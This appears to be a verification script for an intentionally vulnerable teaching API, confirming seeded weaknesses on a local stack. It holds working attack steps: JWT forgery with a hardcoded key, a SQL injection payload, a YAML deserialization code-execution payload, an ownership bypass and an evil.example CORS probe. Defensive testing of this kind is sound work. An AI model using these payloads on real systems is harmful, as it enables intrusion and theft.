#!/usr/bin/env bash
# security/check-seeded.sh - proves the weaknesses seeded in Kairos v0 (plan section 5) against a
# running API. PASS means "the weakness is present", as it must be until its fixing work package:
#   WP4.5 turns SV-01, SV-02 and SV-04 to MISSING, WP5.4 turns SV-06 and SV-08 to MISSING.
# Run it from the repository root (SV-01 reads backend/app/config.py), against a stack you own:
#   bash security/check-seeded.sh [BASE_URL]     default http://localhost:8000
# SV-03, SV-05, SV-07 and SV-09 are shown by other commands: see security/seeded-vulns.md.
# Needs bash, curl and python3. Exit code 0: every checked weakness is present.
set -Eeuo pipefail

BASE="${1:-http://localhost:8000}"
BASE="${BASE%/}"
RUN="$(date +%s)$RANDOM"
FAKE_PW="correct-horse-1"   # throwaway accounts
CONFIG="backend/app/config.py"
present=0
ok=0
missing=0

hit() { printf '  PASS     %s\n' "$1"; present=$((present + 1)); }
miss() { printf '  MISSING  %s\n' "$1"; missing=$((missing + 1)); }
# verdict OK PRESENT-TEXT MISSING-TEXT - OK is 1 when the weakness was shown.
verdict() { if [[ "$1" == 1 ]]; then hit "$2"; else miss "$3"; fi; }
json() { python3 -c 'import json,sys; print(json.load(sys.stdin)[sys.argv[1]])' "$1"; }

# call METHOD PATH TOKEN [BODY [CONTENT-TYPE]] - prints the body, then the status on its own line.
call() {
  local method="$1" path="$2" token="$3" data="${4:-}" ctype="${5:-application/json}"
  local args=(-sS -m 20 -X "$method" -w '\n%{http_code}' -H "Content-Type: $ctype")
  [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")
  [[ -n "$data" ]] && args+=(--data-binary "$data")
  curl "${args[@]}" "$BASE$path"
}
code() { tail -n1 <<<"$1"; }
text() { sed '$d' <<<"$1"; }

new_user() { # new_user NAME -> prints "id token"
  local reg tok
  reg="$(curl -sS -m 20 -H 'Content-Type: application/json' \
    -d "{\"username\":\"$1$RUN\",\"password\":\"$FAKE_PW\"}" "$BASE/api/auth/register")"
  tok="$(curl -sS -m 20 -H 'Content-Type: application/json' \
    -d "{\"username\":\"$1$RUN\",\"password\":\"$FAKE_PW\"}" "$BASE/api/auth/login" | json access_token)"
  printf '%s %s\n' "$(json id <<<"$reg")" "$tok"
}

printf 'Seeded weaknesses of %s\n' "$BASE"
read -r ALICE_ID ALICE <<<"$(new_user alice)"
read -r _ BOB <<<"$(new_user bob)"

# SV-01: the signing key is written in config.py, so anyone who can read the repository can
# sign a token for any user id. The token below is built by hand (HS256) from that key.
KEY="$(sed -n 's/^JWT_SECRET_KEY = "\(.*\)"$/\1/p' "$CONFIG")"
if [[ -n "$KEY" ]]; then
  FORGED="$(KEY="$KEY" python3 - "$ALICE_ID" <<'PY'
import base64, hashlib, hmac, json, os, sys, time

def b64(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

head = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
claims = b64(json.dumps({"sub": sys.argv[1], "exp": int(time.time()) + 300}).encode())
signature = b64(hmac.new(os.environ["KEY"].encode(), head + b"." + claims, hashlib.sha256).digest())
print((head + b"." + claims + b"." + signature).decode())
PY
)"
  r="$(call GET /api/tasks "$FORGED")"
  ok=0; [[ "$(code "$r")" == 200 ]] && ok=1
  verdict "$ok" "SV-01  a token signed with the key from $CONFIG is accepted" \
    "SV-01  a token signed with the key from $CONFIG is refused"
else
  miss "SV-01  no signing key written in $CONFIG"
fi

# SV-02: the search text is part of the SQL, so Bob's search returns Alice's task as well.
call POST /api/tasks "$ALICE" "{\"title\":\"alice-private-$RUN\"}" >/dev/null
call POST /api/tasks "$BOB" "{\"title\":\"bob-note-$RUN\"}" >/dev/null
r="$(call GET "/api/tasks?search=$(python3 -c 'import urllib.parse as u; print(u.quote("%\x27) OR 1=1 --"))')" "$BOB")"
ok=0; [[ "$(code "$r")" == 200 && "$(text "$r")" == *"alice-private-$RUN"* ]] && ok=1
verdict "$ok" "SV-02  an SQL payload in the search returns another user's task" \
  "SV-02  the search stays inside the caller's tasks"

# SV-04: the YAML loader builds Python objects: os.getcwd() runs inside the server.
r="$(call POST /api/tasks/import "$BOB" $'tasks:\n  - title: !!python/object/apply:os.getcwd []\n' application/yaml)"
if [[ "$(code "$r")" == 201 ]]; then
  r="$(call GET /api/tasks "$BOB")"
  ok=0; [[ "$(text "$r")" == *'"title":"/'* ]] && ok=1
  verdict "$ok" "SV-04  a !!python/object tag in an imported YAML ran a function (os.getcwd)" \
    "SV-04  the imported tag was not executed"
else
  miss "SV-04  the YAML with a python object tag was refused"
fi

# SV-06: Bob reads and changes Alice's task by its id.
r="$(call GET /api/tasks "$ALICE")"
ALICE_TASK="$(python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["id"])' <<<"$(text "$r")")"
r="$(call GET "/api/tasks/$ALICE_TASK" "$BOB")"
r2="$(call PUT "/api/tasks/$ALICE_TASK" "$BOB" "{\"title\":\"changed-by-bob-$RUN\",\"description\":\"\",\"done\":false}")"
ok=0; [[ "$(code "$r")" == 200 && "$(code "$r2")" == 200 ]] && ok=1
verdict "$ok" "SV-06  Bob read and changed Alice's task $ALICE_TASK (no ownership check)" \
  "SV-06  Bob cannot reach Alice's task"

# SV-08: error details, CORS and headers.
r="$(call GET "/api/tasks?search=%27" "$BOB")"
ok=0; [[ "$(code "$r")" == 500 && "$(text "$r")" == *Traceback* ]] && ok=1
verdict "$ok" "SV-08  an unexpected error returns its stack trace" \
  "SV-08  unexpected errors do not return a stack trace"
headers="$(curl -sS -m 20 -D - -o /dev/null -H 'Origin: https://evil.example' "$BASE/healthz" | tr -d '\r')"
ok=0
if grep -qi '^access-control-allow-origin: https://evil.example' <<<"$headers" \
  && grep -qi '^access-control-allow-credentials: true' <<<"$headers"; then ok=1; fi
verdict "$ok" "SV-08  CORS answers any origin, with credentials" "SV-08  CORS refuses a foreign origin"
ok=0; grep -qi '^x-powered-by: ' <<<"$headers" && ok=1
verdict "$ok" "SV-08  the framework and Python versions are announced ($(grep -i '^x-powered-by: ' <<<"$headers" | cut -d' ' -f2-))" \
  "SV-08  no version in the headers"
missing_headers=()
for h in strict-transport-security content-security-policy x-content-type-options x-frame-options referrer-policy; do
  grep -qi "^$h:" <<<"$headers" || missing_headers+=("$h")
done
ok=0; [[ ${#missing_headers[@]} -eq 5 ]] && ok=1
verdict "$ok" "SV-08  none of the security headers is set (${missing_headers[*]})" \
  "SV-08  some security headers are set"
ok=0; [[ "$BASE" == http://* ]] && ok=1
verdict "$ok" "SV-08  the API answers in plain HTTP" "SV-08  the API is served over TLS"

printf '\n%d present, %d missing.\n' "$present" "$missing"
[[ "$missing" -eq 0 ]]
